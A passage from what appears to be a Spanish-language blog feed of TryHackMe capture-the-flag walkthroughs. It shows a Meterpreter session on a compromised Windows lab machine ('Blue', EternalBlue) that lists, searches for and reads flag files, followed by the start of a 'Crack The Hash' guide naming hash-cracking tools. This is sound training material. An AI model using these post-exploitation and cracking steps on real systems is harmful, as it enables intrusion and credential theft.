&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meterpreter &amp;gt; ls
Listing: C:&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;============&lt;/span&gt;

Mode                 Size                Type  Last modified                     Name
----                 ----                ----  -------------                     ----
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                   dir   2009-07-13 23:18:56 -0400         &lt;span class=&#34;nv&#34;&gt;$Recycle&lt;/span&gt;.Bin
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                   dir   2009-07-14 01:08:56 -0400         Documents and Settings
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                   dir   2009-07-13 23:20:08 -0400         PerfLogs
40555/r-xr-xr-x      &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;                dir   2009-07-13 23:20:08 -0400         Program Files
40555/r-xr-xr-x      &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;                dir   2009-07-13 23:20:08 -0400         Program Files &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x86&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;                dir   2009-07-13 23:20:08 -0400         ProgramData
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;                   dir   2018-12-12 22:13:22 -0500         Recovery
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;                dir   2018-12-12 18:01:17 -0500         System Volume Information
40555/r-xr-xr-x      &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;                dir   2009-07-13 23:20:08 -0400         Users
40777/rwxrwxrwx      &lt;span class=&#34;m&#34;&gt;16384&lt;/span&gt;               dir   2009-07-13 23:20:08 -0400         Windows
100666/rw-rw-rw-     &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;                  fil   2018-12-12 22:47:39 -0500         flag1.txt
567211570/r-xrwx---  &lt;span class=&#34;m&#34;&gt;438533065912909807&lt;/span&gt;  fif   13905563959-04-24 15:54:40 -0400  hiberfil.sys
567211570/r-xrwx---  &lt;span class=&#34;m&#34;&gt;438533065912909807&lt;/span&gt;  fif   13905563959-04-24 15:54:40 -0400  pagefile.sys

meterpreter &amp;gt; cat flag1.txt 
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;******************&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
meterpreter &amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos dir para encontrar los archivos que lleven el nombre de &lt;strong&gt;&amp;ldquo;flag&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comando:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;dir flag* /s /p
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;dir flag* /s /p
dir flag* /s /p
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;
03/17/2019  02:27 PM                &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; flag1.txt
               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt; bytes

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ecent

03/17/2019  02:26 PM               &lt;span class=&#34;m&#34;&gt;482&lt;/span&gt; flag1.lnk
03/17/2019  02:30 PM               &lt;span class=&#34;m&#34;&gt;848&lt;/span&gt; flag2.lnk
03/17/2019  02:32 PM             2,344 flag3.lnk
               &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;          3,674 bytes

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments

03/17/2019  02:26 PM                &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; flag3.txt
               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;37&lt;/span&gt; bytes

     Total Files Listed:
               &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;          3,735 bytes
               &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  22,796,713,984 bytes free

C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;

C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag3.txt
&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag3.txt
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;*******************************&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ecent&amp;gt;type flag2.lnk
&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; flag2.lnk
L�F�  h+汖��h+汖��&lt;span class=&#34;o&#34;&gt;=]&lt;/span&gt;�����&lt;span class=&#34;s1&#34;&gt;&amp;#39;P�O� �:i�+00�/C:\R1�M�Windows��:���M�*pWindowsV1qN��System32��:��qN��*	System32P1�Mconfig��:���M*�	configX2&amp;#39;&lt;/span&gt;�M flag2.txtﾍM�M*�flag2.txtS-Rf
�C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag2.txt6..&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;.&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag2.txt�C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;	�1SPS�XF�L8C���&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;�m�&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;�Xjon-pc��̴�H�C�Kz�k��:������d&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;d�4
C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ecent&amp;gt;dir /ah C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig
dir /ah C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig

File Not Found

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\J&lt;/span&gt;on&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;oaming&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;ecent&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nuestra &lt;strong&gt;flag2&lt;/strong&gt; se encuentra en **C:\Windows\System32\config**.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;type C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag2.txt
&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;lag2.txt
flag&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;****************************&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/blue/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/blue/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
            
              <category>eternalblue</category>
            
          
            
              <category>ms17_010</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Crack The Hash</title>
        <link>https://sckull.github.io/posts/hashes/</link>
        <pubDate>Thu, 05 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 05 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/hashes/</guid>
        <description>Crack The Hash es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.</description>
        <content:encoded>&lt;p&gt;Crack The Hash es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Crack the hash&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Cracking hashes challenges&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RoomCode&lt;/td&gt;
&lt;td&gt;crackthehash&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;2390&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Relativamente Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;crack-the-hash&#34;&gt;CRACK THE HASH&lt;/h1&gt;
&lt;p&gt;En esta serie de retos nos proveen de distintas hashes las cuales debemos de crackear y enviar el resultado de cada una de estas, al principio utilizamos hash-identifier, hash analyzer y hash identification para identificar el tipo de hash y para el crackeo de los hashes utilizamos hashcat y crackstation.&lt;/p&gt;
&lt;p&gt;Links de la herramientas y paginas utilizadas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.kali.org/password-attacks/hash-identifier&#34;&gt;&lt;strong&gt;hash-identifier&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.tunnelsup.com/hash-analyzer/&#34;&gt;&lt;strong&gt;hash-analyzer&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.onlinehashcrack.com/hash-identification.php&#34;&gt;&lt;strong&gt;hahs-identification&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;&lt;strong&gt;hashcat&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://crackstation.net/&#34;&gt;&lt;strong&gt;crackstation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nivel-1&#34;&gt;NIVEL 1&lt;/h2&gt;
&lt;h3 id=&#34;1-md5&#34;&gt;#1 MD5&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;48bb6e862e54f2a795ffc4e541caed4d&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~# hash-identifier 
   &lt;span class=&#34;c1&#34;&gt;#########################################################################&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	 __  __ 		    __		 ______    _____	   #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;#	 \ \  _  \  /&amp;#39;__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #&lt;/span&gt;
